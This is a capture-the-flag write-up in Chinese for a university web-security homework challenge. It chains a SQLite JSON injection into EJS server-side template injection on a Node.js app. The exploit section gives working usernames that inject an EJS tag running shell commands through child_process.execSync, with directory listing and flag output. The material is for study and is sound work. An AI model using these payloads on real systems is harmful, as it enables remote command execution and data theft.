---
title: Simple Web 0x42(2023 HW - Double Injection - FLAG2)
tags: [eductf, CTF, Web]

category: "Security/Course/NTU CS/Web"
---

# Simple Web 0x42(2023 HW - Double Injection - FLAG2)
<!-- more -->

## Background
Node JS ejs SSTI

## Source code
呈上題

## Recon
這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
![](https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png)
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:
```!
admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- #
```
後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看[之前寫的文章](https://hackmd.io/@SBK6401/HkgkDNsPp)

## Exploit - Ejs SSTI RCE
* Payload 1:
    * Username: 
        ```!
        admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # <%= global.process.mainModule.require("child_process").execSync("ls -al /").toString() %>
        ```
    * Password: `FLAG{sqlite_js0n_inject!on}`
    * Result:
        ```
        total	76	
        drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
        drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
        -rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
        drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
        drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
        drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
        -rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
        -rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
        drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
        drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
        drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
        drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
        drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
        dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
        drwx------	1	root	root	4096	Dec	11	18:36	root	
        drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
        drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
        drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
        dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
        drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
        drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
        drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
        ```
* Payload 2:
    * Username: 
        ```!
        admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # <%= global.process.mainModule.require("child_process").execSync("cat /flag2-1PRmDsTXoo3uPCdq.txt").toString() %>
        ```
    * Password: `FLAG{sqlite_js0n_inject!on}`
    * Result: `FLAG{ezzzzz_sqli2ssti}`

Flag: `FLAG{ezzzzz_sqli2ssti}`

## 補充: How to debug it?
這邊示範如何用vscode debug這個project
1. 可以先看[這個文章](https://hackmd.io/@SBK6401/HkgkDNsPp)準備一些前置作業
2. 在文章中有提到，docker幫忙做的事情，現在要自己完成
    ```bash
    $ sudo touch /flag1.txt ; sudo chmod 777 /flag1.txt ; sudo echo "test" > /flag1.txt
    $ sudo node init-db.js ; sudo chmod 444 /etc/db.sqlite3
    ```
3. 接著就可以開始debug app.js了

## Reference
[CTF 中的 EJS 漏洞筆記](https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/?ref=blog.splitline.tw)
[AIS3-EOF-CTF-2019-Quals - echo WP](https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo)
[ejs RCE CVE-2022-29078 bypass](https://inhann.top/2023/03/26/ejs/)